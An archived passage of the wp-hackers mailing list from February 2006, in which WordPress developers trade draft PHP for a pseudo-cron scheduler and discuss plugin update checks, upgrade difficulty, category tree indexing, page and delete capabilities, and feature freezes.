Works great thanks Austin, and also to Owen on #wordpress for pointing me in the direction of
addLoadEvent();

Cheers guys!

Jamie.

- --
http://jamietalbot.com
-----BEGIN PGP SIGNATURE-----
Version: GnuPG v1.2.5 (MingW32)
Comment: Using GnuPG with Mozilla - http://enigmail.mozdev.org

iD8DBQFD7J4nrovxfShShFARAkTXAKCQOxcW6B+92FCAAJH2wd2FnEX3rACfUnmc
3wjoCuAMCi2mPLaI8gdl/yA=
=RVqb
-----END PGP SIGNATURE-----
From pete.prodoehl at cygnusinteractive.com  Fri Feb 10 14:31:18 2006
From: pete.prodoehl at cygnusinteractive.com (Pete Prodoehl)
Date: Fri Feb 10 14:32:54 2006
Subject: [wp-hackers] post_status = future and pseudo-cron
In-Reply-To: <43EC4C15.5070904@jrm.cc>
References: <43EBCBB3.6010504@boren.nu>	<43EBF5A2.1090206@midnightcircus.com>	<63E0A53A-B590-4223-B8D4-9070F25453CE@txfx.net>	<43EC442E.8080206@ftwr.co.uk>
	<43EC4C15.5070904@jrm.cc>
Message-ID: <43ECA3B6.6010906@cygnusinteractive.com>

Jeff Minard wrote:
> Peter Westwood wrote:
>> wp_schedule_repeating_event('interval-type','interval-amount','time-of-day/hour/week'); 
>>
> 
> 
> May I suggest we take a page from "The History of Every Unix Ever" and 
> at least make the psuedo cron scheduler something that people can learn 
> just once?
> 
> wp_schedule_repeating_event($minute, $hour, $dayofmonth, $month, 
> $dayofweek, $filter_to_activate);
> 
> The whole "* * * * *" thing.

+1 for reusing what exists...


Pete

From jeff at jrm.cc  Fri Feb 10 16:09:32 2006
From: jeff at jrm.cc (Jeff Minard)
Date: Fri Feb 10 16:11:19 2006
Subject: [wp-hackers] post_status = future and pseudo-cron
In-Reply-To: <43EC8D0C.6010606@skippy.net>
References: <43EBCBB3.6010504@boren.nu>	<43EBF5A2.1090206@midnightcircus.com>	<63E0A53A-B590-4223-B8D4-9070F25453CE@txfx.net>	<43EC442E.8080206@ftwr.co.uk>	<43EC4C15.5070904@jrm.cc>
	<43EC8D0C.6010606@skippy.net>
Message-ID: <43ECBABC.7010105@jrm.cc>

Scott Merrill wrote:
> Power users will know how
> to use the system's cron facility, and non-power users are unlikely to
> care about the elegance of any implementation we create.

True, but this isn't for power users, it's for plugin authors. Unless 
we're providing some kind of front end interface for scheduling generic 
events to trigger. And even in those cases, we'd never present anything 
more than:

------------------------------------------
Repeat Every:
  - Hour
  - Day
  - Mon, Tues, Weds, Thurs, Fri, Sat, Sun
  - 1st, 2nd, (etc) of month
------------------------------------------

Which is then up to the author to parse (easily) into a valid format for 
repition.

Plus, it would allow us to create REAL crontab files out of actions, 
should that ever become an option, with little hassle.

As for the precision, perhaps the minutely thing might be a little much 
(mostly cause it's hard to guarantee a hit every single minute of the 
day.) but I would still leave that in with a warning to authors that a * 
rules on the minute option is not likely to work -- it'd still be handy, 
though, for every hour, on the hour "0 * * * *"

Mostly I suggest doing it this way because then there is no confusion 
about how to schedule events -- we can just say "It's exactly like a 
cronjob definition."

Jeff
From ringmaster at midnightcircus.com  Fri Feb 10 16:17:03 2006
From: ringmaster at midnightcircus.com (Owen Winkler)
Date: Fri Feb 10 16:17:19 2006
Subject: [wp-hackers] post_status = future and pseudo-cron
In-Reply-To: <43EC4E7E.1010208@boren.nu>
References: <43EBCBB3.6010504@boren.nu>	<43EBF5A2.1090206@midnightcircus.com>	<63E0A53A-B590-4223-B8D4-9070F25453CE@txfx.net>	<43EC442E.8080206@ftwr.co.uk>	<43EC4C15.5070904@jrm.cc>
	<43EC4E7E.1010208@boren.nu>
Message-ID: <43ECBC7F.3050005@midnightcircus.com>

Ryan Boren wrote:
> Jeff Minard wrote:
>> May I suggest we take a page from "The History of Every Unix Ever" and 
>> at least make the psuedo cron scheduler something that people can 
>> learn just once?
>>
>> wp_schedule_repeating_event($minute, $hour, $dayofmonth, $month, 
>> $dayofweek, $filter_to_activate);
>>
>> The whole "* * * * *" thing.
> 
> Hah!  I'm with you there.  Even after over a decade of dealing with 
> crontab files I still have to scratch my head and look at man pages 
> whenever I edit one.

This is funny.

Ryan has assumed that the message is sarcastic; scheduling cron is 
something he has to look up every time (me too!), and so should be made 
simpler.

Skippy (in forked thread) has assumed that Jeff really meant to leverage 
years of unix documentation to implement a wp_cron format that would be 
familiar to unix users.  (And what is the crossover between unix admin 
and PHP knowledge, I wonder?)

Personally, if I never have to look up how to do things like "Every 20 
minutes on Saturday" in the cron man again, I'll be happier for it.

My vote - Forget the unix cron crap and make this simple:


function wp_schedule_event($timestamp, $hook)
{
	$args = array_slice(func_get_args(), 2);
	$crons = get_option('cron');
	$crons[$timestamp][$hook] = $args;
	ksort($crons);
	update_option('cron', $crons);
}

function wp_unschedule_event($timestamp, $hook)
{
	$crons = get_option('cron');
	unset($crons[$timestamp][$hook]);
	update_option('cron', $crons);
}

function wp_clear_scheduled_hook($hook)
{
	while($timestamp = next_scheduled('scheduled_hook'))
		wp_unschedule_event($timestamp, 'scheduled_hook');
}

function next_scheduled($hook)
{

	$crons = get_option('cron');
	foreach($crons as $timestamp => $cron) {
		if($timestamp <= time()) continue;
		if(isset($cron[$hook])) return $timestamp;
	}
	return false;
}

function spawn_crons()
// Executed frequently/periodically on page loads
{
	if (array_shift(array_keys(get_option('cron')) > time()) return;

// Mostly copied from spawn_pings()
	$ping_url = get_settings('siteurl')
		.'/wp-admin/execute-cron.php?check='
		.md5(DB_PASS . '187425');
	$parts = parse_url($ping_url);
	$argyle = @ fsockopen($parts['host'], $_SERVER['SERVER_PORT'], $errno, 
$errstr, 0.01);
	if ( $argyle )
		fputs($argyle, "GET {$parts['path']}?time=".time()." HTTP/1.0\r\nHost: 
{$_SERVER['HTTP_HOST']}\r\n\r\n");

}

... Then in execute-cron.php ...

require_once('../wp-config.php');
if (array_shift(array_keys(get_option('cron')) > time()) exit;
$crons = get_option('cron');
$newcrons = $crons;
foreach ($crons as $timestamp => $cronhooks) {
	if ($timestamp > time()) break;
	foreach($cronhooks as $hook => $args) {
		do_action($hook, $args);
	}
	unset($newcrons[$timestamp]);
}
update_option('cron', $newcrons);


Adding a new 20-minute repeating event would look like:

wp_schedule_event(time(), 'every_20_minutes', 0);
add_action('every_20_minutes', 'fn_every_20_minutes');
function fn_every_20_minutes($execount)
{
	// Do stuff.
	if (next_scheduled('every_20_minutes') !== false)
	wp_schedule_event(strtotime('+20 minutes'), 'every_20_minutes', 
$execount++);
}


Or something.  (None of the above code has been shown to a parser.)

Owen

From ryan at boren.nu  Fri Feb 10 20:05:22 2006
From: ryan at boren.nu (Ryan Boren)
Date: Fri Feb 10 20:07:01 2006
Subject: [wp-hackers] post_status = future and pseudo-cron
In-Reply-To: <43ECBC7F.3050005@midnightcircus.com>
References: <43EBCBB3.6010504@boren.nu>	<43EBF5A2.1090206@midnightcircus.com>	<63E0A53A-B590-4223-B8D4-9070F25453CE@txfx.net>	<43EC442E.8080206@ftwr.co.uk>	<43EC4C15.5070904@jrm.cc>	<43EC4E7E.1010208@boren.nu>
	<43ECBC7F.3050005@midnightcircus.com>
Message-ID: <43ECF202.2040200@boren.nu>

Owen Winkler wrote:
> My vote - Forget the unix cron crap and make this simple:

Hear, hear.

I took what you provided and added some simple hourly and daily 
recurrence.  More complicated recurrence can be done using the method 
you suggested.  This was briefly tested and seemed to be fairly sane.

function wp_schedule_event($timestamp, $recurrence, $hook) {
	$args = array_slice(func_get_args(), 3);
	$crons = get_option('cron');
	$crons[$timestamp][$hook] = array('recur' => $recurrence, 'args' => $args);
	ksort($crons);
	update_option('cron', $crons);
}

function wp_unschedule_event($timestamp, $hook) {
	$crons = get_option('cron');
	unset($crons[$timestamp][$hook]);
	if ( empty($crons[$timestamp]) )
		unset($crons[$timestamp]);
	update_option('cron', $crons);
}

function wp_clear_scheduled_hook($hook) {
	while($timestamp = next_scheduled('scheduled_hook'))
		wp_unschedule_event($timestamp, 'scheduled_hook');
}

function next_scheduled($hook) {
	$crons = get_option('cron');
	if ( empty($crons) )
		return false;
	foreach($crons as $timestamp => $cron) {
		//if($timestamp <= time()) continue;
		if(isset($cron[$hook])) return $timestamp;
	}
	return false;
}

function spawn_cron() {
	if (array_shift(array_keys(get_option('cron'))) > time()) return;

	$cron_url = get_settings('siteurl') . '/wp-cron.php';
	$parts = parse_url($cron_url);
	$argyle = @ fsockopen($parts['host'], $_SERVER['SERVER_PORT'], $errno, 
$errstr, 0.01);
	if ( $argyle )
		fputs($argyle, "GET {$parts['path']}?time=" . time() . '&check='
		. md5(DB_PASS . '187425') . " HTTP/1.0\r\nHost: 
{$_SERVER['HTTP_HOST']}\r\n\r\n");
}

function wp_cron() {
	if (array_shift(array_keys(get_option('cron'))) > time())
		return;

	$crons = get_option('cron');
	$newcrons = $crons;
	foreach ($crons as $timestamp => $cronhooks) {
		if ($timestamp > time()) break;
		foreach($cronhooks as $hook => $args) {
			do_action($hook, $args['args']);
			$recurrence = $args['recur'];
			if ( 'hourly' == $recurrence )
				wp_schedule_event($timestamp + 3600, $recurrence, $hook, $args['args']);
			else if ( 'daily' == $recurrence )
				wp_schedule_event($timestamp + 86400, $recurrence, $hook, 
$args['args']);

			wp_unschedule_event($timestamp, $hook);
		}
	}
}

wp-cron.php looks like:

<?php
require_once('./wp-config.php');

if ( $_GET['check'] != md5(DB_PASS . '187425') )
	exit;

wp_cron();

?>

spawn_cron() causes some mischief on my server. Pages are slow to load 
and apache2 sometimes bumps to 100% CPU until I kill it.  So, I'm just 
calling wp_cron() from the shutdown hook for now.

Here's a sample plugin implementation:

add_action('test_cron', 'test_cron', 10, 2);

function test_cron($arg1, $arg2) {
         syslog(LOG_ERR, "Arg 1 is $arg1 and arg2 is $arg2");
}

if ( ! next_scheduled('test_cron') )
         wp_schedule_event(time(), 'hourly', 'test_cron', "hello", "world");
From nuclearmoose at gmail.com  Fri Feb 10 20:22:48 2006
From: nuclearmoose at gmail.com (Craig)
Date: Fri Feb 10 20:24:26 2006
Subject: [wp-hackers] Re: Simplicity in 2.next
In-Reply-To: <43EC57CC.8080108@mullenweg.com>
References: <000001c62cb1$8d43c460$6802a8c0@kergan>
	<43E9F1D6.3030505@ryanduff.net>
	<ebe43d680602080610g58468270u@mail.gmail.com>
	<1139428294.1474.11.camel@localhost.localdomain>
	<6901708b0602091148l424bb6e9jc4e00525e2a42f7d@mail.gmail.com>
	<5aa3aa0602091420p3720b934n3c6e8a77b504f706@mail.gmail.com>
	<Pine.BSF.4.64.0602092209340.66264@www.provisio.net>
	<43EC57CC.8080108@mullenweg.com>
Message-ID: <5aa3aa0602101222n381ffc3vbf5d5b4fea0ff758@mail.gmail.com>

I think David has a good point here, regarding the upgrade process. Here is
a cut/paste of the upgrade process as described in the Codex:


   1. Backup your
database<http://codex.wordpress.org/Upgrading_WordPress#Step_1:_Backup_your_database>.
   Read Backing Up Your
Database<http://codex.wordpress.org/Backing_Up_Your_Database>for a
detailed explanation.
   2. Backup ALL your WordPress
files<http://codex.wordpress.org/Upgrading_WordPress#Step_2:_Backup_ALL_your_WordPress_files>in
your WordPress directory. Don't forget your
   .htaccess <http://codex.wordpress.org/Glossary#.htaccess.3C> file.
   3. Verify the
backups<http://codex.wordpress.org/Upgrading_WordPress#Step_3:_Verify_the_backups>you
created are there and usable. This is essential.
   4. Deactivate ALL your
Plugins<http://codex.wordpress.org/Upgrading_WordPress#Step_4:_Deactivate_ALL_your_Plugins>.

   5. Ensure first four steps are
completed<http://codex.wordpress.org/Upgrading_WordPress#Step_5:_Ensure_first_four_steps_are_completed>.
   Do not attempt the upgrade unless you have completed the first four steps.
   6. Download and extract the WordPress
package<http://codex.wordpress.org/Upgrading_WordPress#Step_6:_Download_and_extract_the_WordPress_package>from
   http://wordpress.org/download/.
   7. Delete the old WordPress
files<http://codex.wordpress.org/Upgrading_WordPress#Step_7:_Delete_the_old_WordPress_files>on
your site, but
   *DO NOT DELETE*
      - wp-config.php file;
      - wp-content folder; Special Exception: the
wp-content/cachefolder should be deleted.
      - wp-images folder;
      - wp-includes/languages/ folder--if you are using a language
      file do not delete that folder;
      - .htaccess file--if you have added custom rules to your
      .htaccess, do not delete it.
   8. Upload the new
files<http://codex.wordpress.org/Upgrading_WordPress#Step_8:_Upload_the_new_files>from
your computer's hard drive to the appropriate WordPress folder on your
   site.
   9. Run the WordPress upgrade
program<http://codex.wordpress.org/Upgrading_WordPress#Step_9:_Run_the_WordPress_upgrade_program>and
follow the instructions on the screen.
   10. Update Permalinks and
.htaccess<http://codex.wordpress.org/Upgrading_WordPress#Step_10:_Update_Permalinks_and_.htaccess>.
   Update your Permalink Structure and merge the custom rules, if necessary,
   into your .htaccess <http://codex.wordpress.org/Glossary#.htaccess.3C>file.
   11. Install updated Plugins and
Themes<http://codex.wordpress.org/Upgrading_WordPress#Step_11:_Install_updated_Plugins_and_Themes>.
   Please review the list of Plugins that work in Version
2.0<http://codex.wordpress.org/User:Matt/2.0_Plugin_Compatibility>and
check if your Theme author has a new version.
   12. Reactivate
Plugins<http://codex.wordpress.org/Upgrading_WordPress#Step_12:_Reactivate_Plugins>
   13. Review what has changed in
WordPress<http://codex.wordpress.org/Upgrading_WordPress#Step_13:_Review_what_has_changed_in_WordPress>.



Thirteen steps, and many of the step involve more explicit information
located on other Codex pages. This is all well and good for seasoned users,
but holy shit, imagine yourself as being a rank amateur to all of this and
visit that Codex page. Is it any wonder why many folks balk at upgrading,
unless it's absolutely critical vis a vis a security update?

Are we discussing the simplification of version 2.next in terms of
development environment or user environment? I assume we are talking about
both. Want to seriously make life on the support forums easier for the
volunteers? Build an upgrade tool that does a lot of the above thirteen
steps.

Yeah, I know, easy for me to say, and given that an auto-updater would
require some preemptive changes to WP and such, it may be a bit of the cart
before the horse to suggest. That said, I have always thought of ugrading WP
as a pain given that I have often tweaked or altered specific code to
customize my blog. I have to track those changes and re-apply them after an
upgrade, and it makes the process onerous at times. Takes a lot of the fun
out of maintaining the blog.

Craig.
Nuclear Moose.
From mark.wordpress at txfx.net  Fri Feb 10 21:02:41 2006
From: mark.wordpress at txfx.net (Mark Jaquith)
Date: Fri Feb 10 21:04:20 2006
Subject: [wp-hackers] plugin template tag function
In-Reply-To: <e6ec604d0602100441gaa56104ja18bc7c3a9290916@mail.gmail.com>
References: <200602100040.48565.lists@mattread.com>
	<a491f91d0602100416l3bcecd75w89b043311e513328@mail.gmail.com>
	<e6ec604d0602100441gaa56104ja18bc7c3a9290916@mail.gmail.com>
Message-ID: <5E22932D-821B-494E-AA29-8534F3133C26@txfx.net>

On Feb 10, 2006, at 7:41 AM, Andy Skelton wrote:

> On 2/10/06, Robert Deaton <false.hopes@gmail.com> wrote:
>> Personally, I like the idea that was discussed a few months back,
>> where plugins tell users to put a do_action('plugin_template_hook');
>> or somesuch in the theme, so that it degrades nicely as well. Its a
>> bit shorter and achieves the same purpose.
>
> +1 for elegance

Be sure to tell them to check and make sure they're not stepping on  
an existing hook, (http://wphooks.flatearth.org/) but otherwise, I  
like it a lot!

--
Mark Jaquith
http://txfx.net/


From cohen.dave at gmail.com  Sat Feb 11 00:57:55 2006
From: cohen.dave at gmail.com (Dave Cohen)
Date: Sat Feb 11 00:59:26 2006
Subject: [wp-hackers] Newsforge's article on must have plugins for WP 2.0
Message-ID: <43ED3693.70801@gmail.com>

Since many of you on this list have plugins listed in the article I 
thought you might want to read it incase you didn't see the hits showing 
up in your referral statistics.

http://internet.newsforge.com/article.pl?sid=06/01/30/1724203

-Dave
From davebytes at comcast.net  Sat Feb 11 03:03:38 2006
From: davebytes at comcast.net (David Chait)
Date: Sat Feb 11 03:05:16 2006
Subject: [wp-hackers] Newsforge's article on must have plugins for WP 2.0
References: <43ED3693.70801@gmail.com>
Message-ID: <00c901c62eb7$c20b2140$6e01a8c0@sixfour>

Thanks for the heads up.  Of course, my smallest, lamest, oldest, plugin is 
the one that gets mentioned!  None of my 'biggies'... Ah well. ;)

-d

----- Original Message ----- 
From: "Dave Cohen" <cohen.dave@gmail.com>
To: <wp-hackers@lists.automattic.com>
Sent: Friday, February 10, 2006 7:57 PM
Subject: [wp-hackers] Newsforge's article on must have plugins for WP 2.0


| Since many of you on this list have plugins listed in the article I
| thought you might want to read it incase you didn't see the hits showing
| up in your referral statistics.
|
| http://internet.newsforge.com/article.pl?sid=06/01/30/1724203
|
| -Dave
|


--------------------------------------------------------------------------------


| _______________________________________________
| wp-hackers mailing list
| wp-hackers@lists.automattic.com
| http://lists.automattic.com/mailman/listinfo/wp-hackers
| 

From lists at mattread.com  Sat Feb 11 03:55:39 2006
From: lists at mattread.com (Matt Read)
Date: Sat Feb 11 03:55:45 2006
Subject: [wp-hackers] Plugin Manager
Message-ID: <200602102255.39723.lists@mattread.com>

I've playing around with my installer plugin and I've managed to get a 
framework in place to check for updates via the included IXR libraries. I've 
made the following assumptions.

user clicks on "check for updates" which goes through all plugins looking for 
the "Update Server:" plugin header. it then pings that server with 
"plugins.checkUpdates" query, sending the current plugin version, current wp 
version and plugin name (filename for now). The server then calculates which 
version of the plugin is appropriate for that ver of wp, sending back the 
following params:

	bool update
	string url (where to grab the file)
	string pluginVersion
	string pluginName

it then displays a message to user telling about updates. From there the user 
can click on "update" button to update each plugin; installer base then goes 
and grabs the file (url) and installs it.
	- There should also be a bulk upgrade button to upgrade all.
	  (working on this)

I've also added support for the follwoign plugin headers:

	Max WP Version:
	Min WP Version:
	License: (cause it's neat :) )

Min and max WP version could be used by the upgrade script, as well as the 
plugin manager to deactivate plugins upon upgrade and/or display a message to 
user that this plug is not tested for this wp ver. (working on this)

the Update client/server interaction prolly needs more thought as to how it's 
all going to work (I haven't thought about error handling yet), but that's 
what I got so far.

I've also come across the problem of having unique "package names" for 
plugins, i'm using the base plugin file name for now which works fairly well. 
Maybe we should add a Package Name header to the plugin files that would be a 
"sanitized" name as per wp-svn. or just use the current unsanitized names...

It would also be nice if there was a centralized server, so we'd be able to 
ping the "Central Update Server" telling it I want to install plugin xyz, and 
it will give me the appropriate plug ver for my wp ver.

here's my current ver (I'll email mat to create me a svn folder):
http://mattread.com/dropbox/installer-dev.zip

and here's a blank plugin with Update Server in it so you can see how it works 
(the server is "static" and returns values for this plug only and will say 
there's an update every time):
http://mattread.com/dropbox/blank.zip


-- 
Matthew Read
http://www.mattread.com/
From mark.wordpress at txfx.net  Sat Feb 11 06:38:23 2006
From: mark.wordpress at txfx.net (Mark Jaquith)
Date: Sat Feb 11 06:40:05 2006
Subject: [wp-hackers] Category Operation (Adjacency vs. Modified Preorder)
In-Reply-To: <BAY106-F1058AF149EB2432A9983B49E020@phx.gbl>
References: <BAY106-F1058AF149EB2432A9983B49E020@phx.gbl>
Message-ID: <67487CD7-2CCE-42FE-B50A-781E48976617@txfx.net>

On Feb 10, 2006, at 8:33 AM, Christopher Johnson wrote:

> The method requires a little more work during inserts and updates  
> but allows for much faster and much more flexible queries. An  
> example ... with this method you could extract an entire sub tree  
> from the categories table with only 1 query and no sub-selects (2  
> joins). No recursive post processing is needed either. When  
> retrieving posts by category, multiple sub tree's could be excluded  
> or included with a single query (2 joins). The path to a category,  
> a list of siblings, a list of children, all can be retreived with  
> single query, but not at the same time of course.

It certainly sounds nice.  One thing I noticed about that article is  
that the old "parent style" can be kept, and run in tandem.  Sounds  
to me like we could update the WordPress code to use the transversal  
style, but plugins that directly query the table looking for parent  
relationships wouldn't be left in the dark.

--
Mark Jaquith
http://txfx.net/


From mark.wordpress at txfx.net  Sat Feb 11 06:42:49 2006
From: mark.wordpress at txfx.net (Mark Jaquith)
Date: Sat Feb 11 06:44:26 2006
Subject: [wp-hackers] Documentation on the caching functions?
In-Reply-To: <75835fe10602100602j7fdd98c2r1fb7083750b0bafc@mail.gmail.com>
References: <20060209231114.32274638F@comox.textdrive.com>
	<43EC76B4.4000500@viper007bond.com>
	<43EC8C04.9020401@midnightcircus.com>
	<75835fe10602100602j7fdd98c2r1fb7083750b0bafc@mail.gmail.com>
Message-ID: <E7E40A25-2D49-476A-BB67-FC21270796E3@txfx.net>

On Feb 10, 2006, at 9:02 AM, Justin Moore wrote:

> Didn't Mark used to have some sort of "dropbox" on
> weblogtoolscollection.com? Or there's http://www.yousendit.com which
> I've had a couple of people use to send me files before. Both are only
> a temporary mechanism though and the files wouldn't be preserved for
> long-term archiving.

We should probably have something on the same server as Mailman, so  
the attachments' fate is tied to that of the list.

Anyone have a nice GPL dropbox script that they can recommend?
--
Mark Jaquith
http://txfx.net/


From ryan at boren.nu  Sat Feb 11 10:08:05 2006
From: ryan at boren.nu (Ryan Boren)
Date: Sat Feb 11 10:09:41 2006
Subject: [wp-hackers] New Page and Delete Caps in SVN
Message-ID: <43EDB785.7010308@boren.nu>

By popular demand:

http://trac.wordpress.org/changeset/3513

Now that pages have proper draft/private/publish status we are able to 
give them the full set of caps.  The following caps bring pages up to 
parity with posts.

edit_page
edit_others_pages
edit_published_pages
publish_pages

Delete capabilities now have a separate set of caps.  This was much 
requested by WP as CMS users and by those trying to get Wiki with their 
WordPress.

delete_page
delete_pages
delete_others_pages
delete_published_pages
delete_post
delete_posts
delete_others_posts
delete_published_posts

Enjoy.

Ryan
From ryan at ryanduff.net  Sat Feb 11 11:24:07 2006
From: ryan at ryanduff.net (Ryan Duff)
Date: Sat Feb 11 11:25:46 2006
Subject: [wp-hackers] Plugin Manager
In-Reply-To: <200602102255.39723.lists@mattread.com>
References: <200602102255.39723.lists@mattread.com>
Message-ID: <43EDC957.9060407@ryanduff.net>

Matt Read wrote:
> I've playing around with my installer plugin and I've managed to get a 
> framework in place to check for updates via the included IXR libraries. I've 
> made the following assumptions.
> 
> user clicks on "check for updates" which goes through all plugins looking for 
> the "Update Server:" plugin header. it then pings that server with 
> "plugins.checkUpdates" query, sending the current plugin version, current wp 
> version and plugin name (filename for now). The server then calculates which 
> version of the plugin is appropriate for that ver of wp, sending back the 
> following params:
> 
> 	bool update
> 	string url (where to grab the file)
> 	string pluginVersion
> 	string pluginName
> 
> it then displays a message to user telling about updates. From there the user 
> can click on "update" button to update each plugin; installer base then goes 
> and grabs the file (url) and installs it.
> 	- There should also be a bulk upgrade button to upgrade all.
> 	  (working on this)
> 
> I've also added support for the follwoign plugin headers:
> 
> 	Max WP Version:
> 	Min WP Version:
> 	License: (cause it's neat :) )
> 
> Min and max WP version could be used by the upgrade script, as well as the 
> plugin manager to deactivate plugins upon upgrade and/or display a message to 
> user that this plug is not tested for this wp ver. (working on this)
> 
> the Update client/server interaction prolly needs more thought as to how it's 
> all going to work (I haven't thought about error handling yet), but that's 
> what I got so far.
> 
> I've also come across the problem of having unique "package names" for 
> plugins, i'm using the base plugin file name for now which works fairly well. 
> Maybe we should add a Package Name header to the plugin files that would be a 
> "sanitized" name as per wp-svn. or just use the current unsanitized names...
> 
> It would also be nice if there was a centralized server, so we'd be able to 
> ping the "Central Update Server" telling it I want to install plugin xyz, and 
> it will give me the appropriate plug ver for my wp ver.
> 
> here's my current ver (I'll email mat to create me a svn folder):
> http://mattread.com/dropbox/installer-dev.zip
> 
> and here's a blank plugin with Update Server in it so you can see how it works 
> (the server is "static" and returns values for this plug only and will say 
> there's an update every time):
> http://mattread.com/dropbox/blank.zip
> 
> 


Max and Min version is something that would be nice to have in the 
plugin header. Min version being required, Max being optional, because 
we see what happens in Firefox when somebody sets the max version at 1.5 
and 1.5.0.1 comes out and half of your extensions you just got to work 
with 1.5 are disabled again. Doh!

-- 
Ryan Duff
http://ryanduff.net
AIM: ryancduff
irc.freenode.net #wordpress
From mark.wordpress at txfx.net  Sat Feb 11 11:30:59 2006
From: mark.wordpress at txfx.net (Mark Jaquith)
Date: Sat Feb 11 11:32:39 2006
Subject: [wp-hackers] New Page and Delete Caps in SVN
In-Reply-To: <43EDB785.7010308@boren.nu>
References: <43EDB785.7010308@boren.nu>
Message-ID: <69BD3463-48FC-4B90-9C26-8E595650421F@txfx.net>

On Feb 11, 2006, at 5:08 AM, Ryan Boren wrote:

> Now that pages have proper draft/private/publish status we are able  
> to give them the full set of caps.  The following caps bring pages  
> up to parity with posts.

Note that this bug still applies:
http://trac.wordpress.org/ticket/2257

In order to edit pages, you need edit_posts capability.   
Unfortunately, this is hardcoded in several places... my patch may be  
outdated by now.
--
Mark Jaquith
http://txfx.net/


From agent_eight at hotmail.com  Sat Feb 11 14:03:49 2006
From: agent_eight at hotmail.com (Chris Johnson)
Date: Sat Feb 11 14:04:59 2006
Subject: [wp-hackers] Category Operation (Adjacency vs. Modified Preorder)
References: <BAY106-F1058AF149EB2432A9983B49E020@phx.gbl>
	<67487CD7-2CCE-42FE-B50A-781E48976617@txfx.net>
Message-ID: <BAY106-DAV21F4083499BDFACBD280119E050@phx.gbl>

> It certainly sounds nice.  One thing I noticed about that article is  that 
> the old "parent style" can be kept, and run in tandem.  Sounds  to me like 
> we could update the WordPress code to use the transversal  style, but 
> plugins that directly query the table looking for parent  relationships 
> wouldn't be left in the dark.

By leaving and maintaining the original parent refs you also gain a little 
protection from the left and right indexs getting screwed up by a failed 
update. If anything ever goes wrong, you can just reindex using the parent 
refs. My only concern is that there are plugins out there that modfiy the 
table directly, thereby bypassing the new indexing. Other than that, the 
change would basicly be seamless. I've started by writing a conversion tool 
and replacing the wp_..._category functions in categories.php 
From agent_eight at hotmail.com  Sat Feb 11 14:14:54 2006
From: agent_eight at hotmail.com (Chris Johnson)
Date: Sat Feb 11 14:16:03 2006
Subject: [wp-hackers] Category Operation (Adjacency vs. Modified Preorder)
References: <BAY106-F1058AF149EB2432A9983B49E020@phx.gbl>
	<67487CD7-2CCE-42FE-B50A-781E48976617@txfx.net>
Message-ID: <BAY106-DAV540F9AE8F4C5126CB824E9E050@phx.gbl>

One thing I'm not sure about is if I should bother pre-sorting the table. 
Upon converting to the new indexing, should siblings be sorted by name and 
then during inserts and moves choosing appropriate insertion points. Again, 
this means more effort during inserts and updates but further simplifies 
reads by not requiring recursive processing to sort a tree after a query. 
From denis at semiologic.com  Sat Feb 11 14:35:26 2006
From: denis at semiologic.com (Denis de Bernardy)
Date: Sat Feb 11 14:37:07 2006
Subject: [wp-hackers] Category Operation (Adjacency vs. Modified Preorder)
In-Reply-To: <BAY106-DAV21F4083499BDFACBD280119E050@phx.gbl>
Message-ID: <000001c62f18$669577f0$6802a8c0@kergan>

sql tree preordering works nice, but imho implementing them without
transactions and triggers is really asking for trouble.

D.

From dmhouse at gmail.com  Sat Feb 11 15:32:02 2006
From: dmhouse at gmail.com (David House)
Date: Sat Feb 11 15:33:40 2006
Subject: [wp-hackers] Simplicity in 2.next
In-Reply-To: <6901708b0602091148l424bb6e9jc4e00525e2a42f7d@mail.gmail.com>
References: <000001c62cb1$8d43c460$6802a8c0@kergan>
	<43E9F1D6.3030505@ryanduff.net>
	<ebe43d680602080610g58468270u@mail.gmail.com>
	<1139428294.1474.11.camel@localhost.localdomain>
	<6901708b0602091148l424bb6e9jc4e00525e2a42f7d@mail.gmail.com>
Message-ID: <ebe43d680602110732t76a7c42fi@mail.gmail.com>

On 09/02/06, Joey B <tunicwriter@gmail.com> wrote:
> There's not a lot a plugin author can do during the beta phase since
> things are bound to change, and whatever work is accomplished will
> more than likely be undone by time the final product is released.

Completely wrong. In the late beta/RC stages, we shouldn't be making
big changes to the code. We should basically be in feature freeze and
API freeze, so no changes will be made that will break plugins.

--
-David House, dmhouse@gmail.com, http://xmouse.ithium.net
From agent_eight at hotmail.com  Sat Feb 11 15:32:35 2006
From: agent_eight at hotmail.com (Chris Johnson)
Date: Sat Feb 11 15:33:45 2006
Subject: [wp-hackers] Category Operation (Adjacency vs. Modified Preorder)
References: <000001c62f18$669577f0$6802a8c0@kergan>
Message-ID: <BAY106-DAV91469B553550C9EC4A32F9E050@phx.gbl>

> sql tree preordering works nice, but imho implementing them without
> transactions and triggers is really asking for trouble.

Yeah, that's the downside of basicly going from one tree index (cat_parent) 
to three( left, right, parent). There are three index's that can get fouled 
up with a bad write operation.

I suppose performing an index check after every insert/update might be a bit 
excessive .. or would it? 
From false.hopes at gmail.com  Sat Feb 11 16:52:18 2006
From: false.hopes at gmail.com (Robert Deaton)
Date: Sat Feb 11 16:53:56 2006
Subject: [wp-hackers] Simplicity in 2.next
In-Reply-To: <ebe43d680602110732t76a7c42fi@mail.gmail.com>
References: <000001c62cb1$8d43c460$6802a8c0@kergan>
	<43E9F1D6.3030505@ryanduff.net>
	<ebe43d680602080610g58468270u@mail.gmail.com>
	<1139428294.1474.11.camel@localhost.localdomain>
	<6901708b0602091148l424bb6e9jc4e00525e2a42f7d@mail.gmail.com>
	<ebe43d680602110732t76a7c42fi@mail.gmail.com>
Message-ID: <a491f91d0602110852o7975d249y4019c4d4f1115563@mail.gmail.com>

On 2/11/06, David House <dmhouse@gmail.com> wrote:
> On 09/02/06, Joey B <tunicwriter@gmail.com> wrote:
> > There's not a lot a plugin author can do during the beta phase since
> > things are bound to change, and whatever work is accomplished will
> > more than likely be undone by time the final product is released.
>
> Completely wrong. In the late beta/RC stages, we shouldn't be making
> big changes to the code. We should basically be in feature freeze and
> API freeze, so no changes will be made that will break plugins.

What should happen and what does happen are far from similar. In fact,
I do remember with the releases prior to 2.0, during the "feature
freeze" time there was a big argument because new features were
committed. 2.0 never even had a formal feature freeze period, so I
think he has a valid point. We need to formalize this, get a real
feature freeze or at least API freeze period to give plugin authors a
chance to adapt.

--
--Robert Deaton
http://somethingunpredictable.com
From false.hopes at gmail.com  Sat Feb 11 17:03:27 2006
From: false.hopes at gmail.com (Robert Deaton)
Date: Sat Feb 11 17:05:03 2006
Subject: [wp-hackers] Category Operation (Adjacency vs. Modified Preorder)
In-Reply-To: <000001c62f18$669577f0$6802a8c0@kergan>
References: <BAY106-DAV21F4083499BDFACBD280119E050@phx.gbl>
	<000001c62f18$669577f0$6802a8c0@kergan>
